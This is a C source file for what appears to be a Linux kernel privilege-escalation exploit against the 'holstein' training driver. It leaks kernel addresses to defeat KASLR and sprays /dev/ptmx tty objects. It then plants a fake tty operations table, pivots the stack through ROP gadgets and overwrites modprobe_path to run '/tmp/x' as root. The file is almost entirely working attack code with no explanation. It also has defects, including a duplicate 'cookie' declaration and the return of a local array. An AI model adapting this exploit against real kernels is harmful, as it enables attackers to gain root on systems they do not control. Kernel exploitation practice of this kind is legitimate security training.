#include "kpwn.h"

int global_fd;
char *VULN_DRV = "/dev/holstein";

void open_dev() {
    global_fd = open(VULN_DRV, O_RDWR);
    if (global_fd < 0) {
        printf("[!] Failed to open %s\n", VULN_DRV);
        exit(-1);
    } else {
        printf("[+] Successfully opened %s\n", VULN_DRV);
    }
}

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t) spawn_shell;
unsigned long cookie;
uint64_t cookie;
uint64_t kgaslr_leak;
uint64_t kbase;
uint8_t cookie_off;

uint64_t* leak_cookie() {
    uint8_t sz = 0x500 / 8 ;
    uint64_t leak[sz];
    memset(leak, 0, sizeof(leak));
    printf("[*] Attempting to leak up to %zu bytes\n", sizeof(leak));
    ssize_t bytes_read = read(global_fd, leak, sizeof(leak));

    if (bytes_read <= 0) {
        perror("[!] Failed to read from device during leak attempt");
        exit(-1);
    }
    printf("[*] Read %zd bytes. Searching leak...\n", bytes_read);


    for (uint8_t i = 0; i < sz; i++) {
        if (i * sizeof(uint64_t) >= bytes_read) break;

        uint64_t current_leak = leak[i];
        char leak_str[99];
        sprintf(leak_str, "%#02lx", current_leak);
        printf("\t--> %d: leak + 0x%x\t: %s", i, (unsigned int)(sizeof(leak[0]) * i), leak_str);

        int printed_marker = 0;
        if (!cookie && is_cookie(leak_str) && i > 2) {
            printf("\t<== stack canary\n");
            cookie_off = i;
            cookie = current_leak;
            printed_marker = 1;
        }

        if (!printed_marker) {
            puts("");
        }
    }

    kgaslr_leak = leak[131] - 0xc38880;
	if(!cookie) {
    	puts("[!] Failed to leak stack cookie!");
    }else {
        printf("[*] Found stack cookie: %#018lx at offset %d\n", cookie, cookie_off);
    }

    return leak;
}

void fatal(const char *resource) {
    perror(resource);
    exit(-1);
}


int main() {
    set_root_probe();
    save_state();
    int spray_buf[100];

    for (int i = 0; i < 50; i++){
        spray_buf[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray_buf[i] < 0) {
            fatal("ptmx");
        }
    }
    open_dev();
    for (int i = 50; i < 100; i++){
        spray_buf[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray_buf[i] < 0) {
            fatal("ptmx");
        }
    }

    char buf[0x500];
    read(global_fd, buf, 0x500);
    kgaslr_leak = *(unsigned long*)&buf[0x418] - 0xc38880;

    dump(buf, 0x500);

    printf("[*] kgaslr leak: %#018lx\n", kgaslr_leak);

    if ( kgaslr_leak & 0x100000 ) {
        puts("[!] Failed to get kgaslr leak");
        exit(-1);
    } 
    

    uint64_t g_buf = *(unsigned long*)&buf[0x438] - 0x438;
    uint64_t driver= *(unsigned long*)&buf[0x438] - 0x9ef538;

    printf("[+] g_buf = 0x%016lx\n", g_buf);

    // 0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;
    // 0xffffffff8162f846: mov [rdi+0x18], rsi; ret;
    // 0xffffffff8153a34f: pop rdi; ret;
    // 0xffffffff813c46de: pop rsi; ret;
    uint64_t mov_rdi_rsi = kgaslr_leak + 0x62f846;
    uint64_t pop_rdi = kgaslr_leak + 0x53a34f;
    uint64_t pop_rsi = kgaslr_leak + 0x3c46de;
    uint64_t modprobe = kgaslr_leak + 0xe38180;
    uint64_t trampoline = kgaslr_leak + 0x800e10;
    uint64_t pivot_gadget = kgaslr_leak + 0x3a478a;

    // fake vtable are now in buffer (g_buf)
    struct tty_struct *tty = (uint64_t *)&buf[0x400]; 
    struct fake_operations_table *vtable = (uint64_t *)&buf;
    memcpy(buf, &fake_tty, sizeof(fake_tty));

    tty->driver = driver;
    tty->ops = g_buf;

    vtable->ioctl = pivot_gadget;
    dump(buf, 0x500);

    uint64_t *chain = (unsigned long*)&buf[0x100];
    #define ch *chain++ 
    ch = pop_rdi;
    ch = modprobe - 0x18;
    ch = pop_rsi;
    ch = *(uint64_t*)"/tmp/x\x00";
    ch = mov_rdi_rsi;
    ch = trampoline+22;
    ch = 0;
    ch = 0;
    ch = (uint64_t) get_root_probe;
    ch = user_cs;
    ch = user_rflags;
    ch = user_sp;
    ch = user_ss;

    write(global_fd, buf, 0x500);

    for (int i = 0; i < 100; i++) {
        printf("ioctl spray %d\n", i);
        ioctl(spray_buf[i], 0xdeadbeef, g_buf + 0x100 - 0x10);
    }

    close(global_fd);
}